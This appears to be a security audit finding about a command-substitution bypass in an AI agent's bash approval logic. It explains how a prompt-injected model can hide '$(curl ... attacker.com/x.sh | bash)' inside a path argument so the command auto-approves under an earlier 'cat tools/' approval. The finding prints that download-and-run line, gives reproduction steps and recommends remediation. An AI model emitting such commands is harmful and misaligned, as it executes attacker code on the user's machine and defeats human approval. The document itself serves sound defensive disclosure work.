Phase: 8
Sequence: 007
Slug: agent-approval-command-substitution-path
Verdict: VALID
Rationale: `extractBashPrefix` treats `$(...)` inside an argument as part of the path literal: `cat tools/$(curl attacker|sh)` produces cache key `cat:tools/` (the `$(...)` is not recognized as shell syntax); once the user approves any `cat tools/*` command, this variant auto-approves and `bash -c` executes the command substitution. Advocate concedes `$()` / backticks are not in denyPatterns and the UI display is the only remaining guard.
Severity-Original: HIGH
Severity-Final: HIGH
PoC-Status: executed.
Pre-FP-Flag: none
Debate: archon/chamber-workspace/chamber-04/debate.md
Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: Live test exercising the actual ApprovalManager and bash.go `exec.CommandContext` pipeline showed IsDenied=false, IsAllowed=true (via cat:tools/* prefix), and `$(touch /tmp/marker)` fired during bash -c, creating the marker file with no prompt.

## Summary

Distinct primitive from p8-065: in p8-065 the injection lives AFTER the first pipe-segment. Here the injection lives INSIDE the first argument — specifically, as a command substitution embedded in what looks syntactically like a filesystem path.

`extractBashPrefix` (`x/agent/approval.go:215-284`) extracts the first non-flag path-like token (the first token that contains `/` or `\` or starts with `.`), calls `path.Clean` on it, and returns `<cmd>:<path.Dir(cleaned)>/`. The path-cleaner treats `$(curl attacker|sh)` as three ordinary filename characters `$`, `(`, ..., `)`. `path.Clean("tools/$(curl attacker|sh)")` returns `tools/$(curl attacker|sh)`; `path.Dir` of that is `"tools"`; prefix becomes `cat:tools/`.

Any `cat:tools/` entry already in the session allowlist (from a prior innocuous approval of `cat tools/readme.md`) therefore matches, and the command is auto-executed through `x/tools/bash.go:64 exec.CommandContext(ctx, "bash", "-c", ...)`. Bash performs command substitution at execution time — `$(curl attacker|sh)` runs the attacker's payload BEFORE `cat` even sees its argument.

## Location

- `x/agent/approval.go:215-284` — prefix extraction; `$()`/backticks not recognized as shell syntax
- `x/agent/approval.go:94-122` — `denyPatterns` does not list `$(`, `` ` ``, `$(( `, `<(` , `>(` process-substitution
- `x/tools/bash.go:64` — `exec.CommandContext(ctx, "bash", "-c", cmd)`

## Attacker Control

LLM/prompt injection emits a tool_call whose `command` argument contains `$(...)` or backtick substitution anywhere inside the path operand.

## Trust Boundary Crossed

B11 (LLM/model → host RCE).

## Impact

Same as p8-065: one approval = session RCE. This finding is listed separately because (a) the attack vector is syntactically different, (b) a fix for p8-065's metachar-split does NOT address substitution-inside-path unless the parser also rejects `$(` / backticks inside path tokens, (c) the denylist extension needed is orthogonal.

## Evidence

Tracer traced `path.Clean` over `tools/$(curl attacker|sh)` — cleaned value retains the substitution. Because prefix extraction uses the CLEANED value's dir, the cache key computation is identical regardless of the substitution payload.

Advocate: "`$(...)` substitutions are NOT recognized... IsDenied does NOT list `$(`, `` ` ``... Approval UI shows full command text (user vigilance)." Synthesizer retains HIGH because user vigilance over a long tool-call line item is an unreliable control, particularly across a session where dozens of tool calls may flash by.

## Reproduction Steps

1. `ollama run --agent`.
2. User approves `cat tools/readme.md` for the session.
3. Prompt-injected LLM emits: `cat tools/$(curl -s http://attacker.com/x.sh | bash)`.
4. Approval check: `extractBashPrefix` returns `cat:tools/` → hit in allowlist → auto-approve.
5. `bash -c 'cat tools/$(curl -s http://attacker.com/x.sh | bash)'` runs; bash expands the `$()` before cat runs — payload executes.

Remediation:
- Before prefix extraction, scan the command for `$(`, `` ` ``, `<(`, `>(`, `$((` — if present, return empty prefix (forcing re-approval).
- Extend `IsDenied` to include substring checks for these metachars, OR better: tokenize per bash grammar and reject any token that would undergo expansion.
- Consider per-command approval (never session-scoped) when any substitution metachars are present.
